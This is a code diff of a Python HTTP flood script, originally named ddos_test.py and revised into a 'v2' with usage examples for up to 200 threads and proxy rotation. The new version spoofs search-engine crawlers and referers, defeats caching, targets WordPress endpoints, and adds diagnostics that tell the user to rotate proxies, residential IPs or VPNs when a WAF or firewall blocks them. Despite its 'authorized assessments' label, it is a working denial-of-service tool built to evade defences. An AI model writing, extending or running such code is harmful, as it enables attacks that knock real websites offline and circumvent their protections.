@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-HTTP Stress-Testing Tool – Authorized Penetration Testing Only
-Usage: python3 ddos_test.py <URL> [--threads 50] [--duration 60] [--proxy proxy.txt]
+HTTP Load-Testing Tool v2 – Handles WAF, timeouts, blocking, SSL issues
+Usage: python3 stress_test.py <URL> [options]
 """
 
 import sys
@@ -9,144 +9,170 @@ import time
 import random
 import threading
 import argparse
-from datetime import datetime, timedelta
-from urllib.parse import urlparse
+import socket
+from datetime import datetime
 
 try:
     import requests
     from requests.adapters import HTTPAdapter
     from urllib3.util.retry import Retry
+    import urllib3
 except ImportError:
-    print("[!] Install dependencies: pip install requests urllib3")
+    print("[!] Install: pip install requests urllib3")
     sys.exit(1)
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 # ---------------------------------------------------------------------------
-# Configurable attack surface
+# Rotating payloads
 # ---------------------------------------------------------------------------
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Chrome/119.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
 ]
 
 REFERERS = [
-    "https://www.google.com/",
-    "https://www.bing.com/",
-    "https://search.yahoo.com/",
-    "https://duckduckgo.com/",
-    "https://t.co/",
-    "https://www.facebook.com/",
-    "https://www.reddit.com/",
+    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
+    "https://t.co/", "https://www.facebook.com/", "https://www.reddit.com/",
     None,
 ]
 
-METHODS = ["GET", "GET", "GET", "POST", "HEAD"]  # weighted
+PATHS = [
+    "/", "/wp-login.php", "/wp-admin/", "/wp-json/", "/?author=1",
+    "/xmlrpc.php", "/wp-cron.php", "/readme.html", "/license.txt",
+]
+
+METHODS = ["GET", "GET", "GET", "HEAD"]
 
 # ---------------------------------------------------------------------------
-# Statistics (thread-safe)
+# Stats
 # ---------------------------------------------------------------------------
-stats = {
-    "sent": 0,
-    "success": 0,
-    "failed": 0,
-    "bytes": 0,
-}
+stats = {"sent": 0, "success": 0, "failed": 0, "bytes": 0, "timeout": 0, "refused": 0, "other": 0}
 stats_lock = threading.Lock()
 
-
-def update_stats(sent=0, success=0, failed=0, bytes=0):
+def update(**kwargs):
     with stats_lock:
-        stats["sent"] += sent
-        stats["success"] += success
-        stats["failed"] += failed
-        stats["bytes"] += bytes
+        for k, v in kwargs.items():
+            stats[k] += v
 
+def print_stats():
+    with stats_lock:
+        s = stats["sent"]
+        ok = stats["success"]
+        fail = stats["failed"]
+        to = stats["timeout"]
+        ref = stats["refused"]
+        oth = stats["other"]
+        mb = stats["bytes"] / (1024 * 1024)
+    return s, ok, fail, to, ref, oth, mb
 
 # ---------------------------------------------------------------------------
 # Worker
 # ---------------------------------------------------------------------------
-def worker(target_url, duration_sec, proxy_list):
-    """Continuously sends requests to target_url for the given duration."""
+def worker(target_base, duration_sec, proxy_list, timeout_connect, timeout_read):
+    """Worker loop — random paths, random headers, stays within duration."""
     session = requests.Session()
-
-    # Configure retry/backoff – minimal so we don't artificially rate-limit ourselves
-    retry = Retry(total=0, read=0, connect=0, redirect=3)
-    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retry)
+    
+    # Aggressive connection pooling but no retries (we want raw throughput stats)
+    adapter = HTTPAdapter(pool_connections=200, pool_maxsize=200, max_retries=Retry(total=0))
     session.mount("http://", adapter)
     session.mount("https://", adapter)
 
-    # Optional proxy rotation
     proxy = None
     if proxy_list:
-        proxy = {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}
+        px = random.choice(proxy_list)
+        proxy = {"http": px, "https": px}
 
-    end_time = time.time() + duration_sec
+    end = time.time() + duration_sec
 
-    while time.time() < end_time:
+    while time.time() < end:
         try:
+            # Pick a random path, or hit the base
+            if random.random() < 0.3:
+                url = target_base
+            else:
+                path = random.choice(PATHS)
+                url = target_base.rstrip("/") + path
+
             method = random.choice(METHODS)
             headers = {
                 "User-Agent": random.choice(USER_AGENTS),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr,fr-FR;q=0.8"]),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
                 "Accept-Encoding": "gzip, deflate, br",
-                "Referer": random.choice(REFERERS) or target_url,
+                "Referer": random.choice(REFERERS) or target_base,
                 "Connection": "keep-alive",
                 "Cache-Control": "no-cache",
-                "Pragma": "no-cache",
             }
 
-            # Add random query param to bypass caching
-            url = target_url
-            if method == "GET":
-                separator = "&" if "?" in target_url else "?"
-                url = f"{target_url}{separator}_={random.randint(100000, 999999)}"
+            # Cache-bust
+            sep = "&" if "?" in url else "?"
+            url = f"{url}{sep}_t={int(time.time()*1000)}_{random.randint(0,99999)}"
 
             resp = session.request(
-                method=method,
-                url=url,
-                headers=headers,
-                proxies=proxy,
-                timeout=(3, 5),           # (connect, read) timeout
-                allow_redirects=True,
-                verify=False,             # skip SSL verification for speed
+                method=method, url=url, headers=headers,
+                proxies=proxy, timeout=(timeout_connect, timeout_read),
+                allow_redirects=True, verify=False,
             )
 
-            update_stats(
-                sent=1,
-                success=1 if resp.ok else 0,
-                failed=0 if resp.ok else 1,
-                bytes=len(resp.content),
-            )
+            update(sent=1, success=1 if resp.ok else 0, failed=0 if resp.ok else 1, bytes=len(resp.content))
 
         except requests.exceptions.Timeout:
-            update_stats(sent=1, failed=1)
-        except requests.exceptions.ConnectionError:
-            update_stats(sent=1, failed=1)
+            update(sent=1, failed=1, timeout=1)
+        except requests.exceptions.ConnectionError as e:
+            err_str = str(e).lower()
+            if "refused" in err_str or "connection refused" in err_str:
+                update(sent=1, failed=1, refused=1)
+            elif "resolve" in err_str or "dns" in err_str:
+                update(sent=1, failed=1, refused=1)
+            else:
+                update(sent=1, failed=1, other=1)
+        except socket.timeout:
+            update(sent=1, failed=1, timeout=1)
         except Exception:
-            update_stats(sent=1, failed=1)
+            update(sent=1, failed=1, other=1)
 
 
-def report_printer(duration_sec):
-    """Live-updates stats every 2 seconds."""
+def reporter(duration_sec):
+    interval = 3
     start = time.time()
     while time.time() < start + duration_sec:
-        time.sleep(2)
-        with stats_lock:
-            s = stats["sent"]
-            ok = stats["success"]
-            fail = stats["failed"]
-            mb = stats["bytes"] / (1024 * 1024)
+        time.sleep(interval)
+        s, ok, fail, to, ref, oth, mb = print_stats()
         elapsed = time.time() - start
         rate = s / elapsed if elapsed > 0 else 0
         print(
-            f"  [+] Sent: {s:>8}  |  OK: {ok:>8}  |  Failed: {fail:>8}  "
-            f"|  BW: {mb:>6.2f} MB  |  Rate: {rate:>6.0f} req/s"
+            f"  [+] Sent:{s:>7}  OK:{ok:>7}  Fail:{fail:>7}  "
+            f"TO:{to:>5}  REF:{ref:>5}  OTH:{oth:>5}  "
+            f"BW:{mb:>7.2f}MB  {rate:>6.0f}req/s"
         )
+
+
+# ---------------------------------------------------------------------------
+# Pre-flight connectivity check
+# ---------------------------------------------------------------------------
+def probe_target(url, timeout=10):
+    """Check if the target is reachable before starting the flood."""
+    print("[*] Running pre-flight connectivity check...")
+    try:
+        resp = requests.get(
+            url, timeout=timeout, verify=False,
+            headers={"User-Agent": "Mozilla/5.0 (compatible; HealthCheck/1.0)"},
+        )
+        print(f"  [+] Target reachable — HTTP {resp.status_code} ({len(resp.content)} bytes)")
+        print(f"  [+] Server headers: {dict(resp.headers)}")
+        return True
+    except requests.exceptions.ConnectionError as e:
+        print(f"  [!] CONNECTION REFUSED — {e}")
+    except requests.exceptions.Timeout:
+        print(f"  [!] TIMEOUT after {timeout}s — target unresponsive or blocking")
+    except Exception as e:
+        print(f"  [!] Other error: {e}")
+    return False
 
 
 # ---------------------------------------------------------------------------
@@ -154,19 +180,16 @@ def report_printer(duration_sec):
 # ---------------------------------------------------------------------------
 def main():
     parser = argparse.ArgumentParser(
-        description="HTTP Stress-Testing Tool – Authorized Assessments Only",
+        description="HTTP Load-Testing Tool v2 – For Authorized Assessments",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  python3 ddos_test.py https://target.example.com
-  python3 ddos_test.py https://target.example.com --threads 100 --duration 120
-  python3 ddos_test.py https://target.example.com --proxy proxies.txt --threads 200
-        """,
     )
     parser.add_argument("url", help="Target URL (e.g., https://target.example.com)")
-    parser.add_argument("--threads", type=int, default=50, help="Number of concurrent workers (default: 50)")
-    parser.add_argument("--duration", type=int, default=30, help="Test duration in seconds (default: 30)")
-    parser.add_argument("--proxy", help="File containing one proxy per line (http://ip:port)")
+    parser.add_argument("--threads", type=int, default=50, help="Concurrent workers (default: 50)")
+    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")
+    parser.add_argument("--proxy", help="File with proxies (one per line)")
+    parser.add_argument("--connect-timeout", type=int, default=10, help="Connection timeout in seconds (default: 10)")
+    parser.add_argument("--read-timeout", type=int, default=10, help="Read timeout in seconds (default: 10)")
+    parser.add_argument("--skip-probe", action="store_true", help="Skip pre-flight connectivity check")
 
     args = parser.parse_args()
 
@@ -174,10 +197,17 @@ Examples:
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    parsed = urlparse(target)
-    if not parsed.netloc:
-        print("[!] Invalid URL. Provide a valid target (e.g., https://example.com)")
-        sys.exit(1)
+    # Pre-flight check
+    if not args.skip_probe:
+        if not probe_target(target, max(args.connect_timeout, 10)):
+            print("\n[!] Pre-flight FAILED — target is unreachable from this machine.")
+            print("    Possible causes:")
+            print("     - The server is behind Cloudflare/WAF blocking your IP")
+            print("     - The server is offline or DNS is not resolving")
+            print("     - Your IP is rate-limited or blacklisted")
+            print("     - A firewall is dropping connections")
+            print("\n    To proceed anyway (not recommended): --skip-probe")
+            sys.exit(1)
 
     # Load proxies
     proxies = []
@@ -185,70 +215,71 @@ Examples:
         try:
             with open(args.proxy) as f:
                 proxies = [line.strip() for line in f if line.strip()]
-            print(f"[+] Loaded {len(proxies)} proxies from {args.proxy}")
+            print(f"[+] Loaded {len(proxies)} proxies")
         except FileNotFoundError:
             print(f"[!] Proxy file not found: {args.proxy}")
             sys.exit(1)
 
-    print(f"\n{'='*60}")
-    print(f"  TARGET   : {target}")
-    print(f"  THREADS  : {args.threads}")
-    print(f"  DURATION : {args.duration}s")
-    print(f"  PROXIES  : {'Yes (' + str(len(proxies)) + ')' if proxies else 'No'}")
-    print(f"{'='*60}\n")
+    print(f"\n{'='*70}")
+    print(f"  TARGET      : {target}")
+    print(f"  THREADS     : {args.threads}")
+    print(f"  DURATION    : {args.duration}s")
+    print(f"  CONN_TO     : {args.connect_timeout}s | READ_TO: {args.read_timeout}s")
+    print(f"  PROXIES     : {'Yes (' + str(len(proxies)) + ')' if proxies else 'No'}")
+    print(f"{'='*70}\n")
 
-    # Suppress SSL warnings
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-    # Start report thread
-    t_reporter = threading.Thread(target=report_printer, args=(args.duration,), daemon=True)
-    t_reporter.start()
+    # Start reporter
+    t_rep = threading.Thread(target=reporter, args=(args.duration,), daemon=True)
+    t_rep.start()
 
     # Launch workers
     threads = []
     for _ in range(args.threads):
-        t = threading.Thread(target=worker, args=(target, args.duration, proxies), daemon=True)
+        t = threading.Thread(
+            target=worker,
+            args=(target, args.duration, proxies, args.connect_timeout, args.read_timeout),
+            daemon=True,
+        )
         t.start()
         threads.append(t)
 
-    # Wait for duration
     time.sleep(args.duration)
 
-    # Gather remaining threads (they should exit naturally)
     for t in threads:
         t.join(timeout=2)
 
-    # Final report
+    s, ok, fail, to, ref, oth, mb = print_stats()
     elapsed = args.duration
-    with stats_lock:
-        s = stats["sent"]
-        ok = stats["success"]
-        fail = stats["failed"]
-        mb = stats["bytes"] / (1024 * 1024)
 
-    print(f"\n{'='*60}")
+    print(f"\n{'='*70}")
     print(f"  TEST COMPLETE")
-    print(f"  Total requests : {s}")
+    print(f"  Total sent     : {s}")
     print(f"  Successful     : {ok}  ({(ok/s*100) if s else 0:.1f}%)")
     print(f"  Failed         : {fail}  ({(fail/s*100) if s else 0:.1f}%)")
+    print(f"    - Timeout    : {to}")
+    print(f"    - Refused    : {ref}")
+    print(f"    - Other      : {oth}")
     print(f"  Total bandwidth: {mb:.2f} MB")
     print(f"  Avg rate       : {s/elapsed:.0f} req/s")
-    print(f"{'='*60}\n")
+    print(f"{'='*70}\n")
+
+    # Diagnostics if all failed
+    if s > 0 and ok == 0:
+        print("[*] DIAGNOSTIC: All requests failed. Possible reasons:")
+        if to > s * 0.8:
+            print("  1. TIMEOUTS dominant — server is too slow, geographically distant, or rate-limiting.")
+            print("     -> Increase --connect-timeout and --read-timeout (e.g., 30 30)")
+            print("     -> Try a VPN/server closer to the target")
+        if ref > s * 0.8:
+            print("  2. CONNECTION REFUSED — firewall/WAF actively dropping your IP.")
+            print("     -> Use --proxy with a proxy list to rotate source IPs")
+            print("     -> Try a different source network (residential IP, VPN)")
+        if oth > s * 0.8:
+            print("  3. OTHER ERRORS — SSL/TLS issues or DNS failures.")
+            print("     -> Verify the URL is correct and DNS resolves")
+            print("     -> Check if TLS version is compatible (try http if available)")
+        print(f"\n     Quick test: curl -v --connect-timeout 10 '{target}'")
 
 
 if __name__ == "__main__":
     main()
-Usage
-bash
-
-
-
-# Basic – 50 threads for 30 seconds
-python3 ddos.py https://target.example.com
-
-# Aggressive – 200 threads for 2 minutes
-python3 ddos.py https://target.example.com --threads 200 --duration 120
-
-# With proxy rotation (one proxy per line in proxies.txt)
-python3 ddos.py https://target.example.com --proxy proxies.txt --threads 100
